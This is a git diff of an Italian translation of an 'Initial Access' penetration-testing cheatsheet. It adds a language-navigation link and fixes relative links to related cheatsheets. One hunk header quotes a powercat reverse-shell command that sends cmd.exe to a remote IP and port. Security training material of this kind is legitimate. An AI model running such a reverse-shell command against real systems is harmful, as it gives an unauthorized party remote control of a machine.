@@ -1,5 +1,8 @@
 # 🚪 Fase 1: Initial Access
 
+<!-- language-home-navigation -->
+[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
+
 ```
   ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
   ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
@@ -276,10 +279,10 @@ powercat -c 10.10.10.10 -p 4444 -e cmd.exe
 
 ## 🔗 Cheatsheet Correlati
 
-- [Metasploit](../Metasploit/translations/README.it.md)
-- [SQLMap](../SQLMap/translations/README.it.md)
-- [Hydra](../Hydra/translations/README.it.md)
-- [Web Vulnerabilities](../SSRF/translations/README.it.md)
+- [Metasploit](../../Metasploit/translations/README.it.md)
+- [SQLMap](../../SQLMap/translations/README.it.md)
+- [Hydra](../../Hydra/translations/README.it.md)
+- [Web Vulnerabilities](../../SSRF/translations/README.it.md)
 
 ---
 
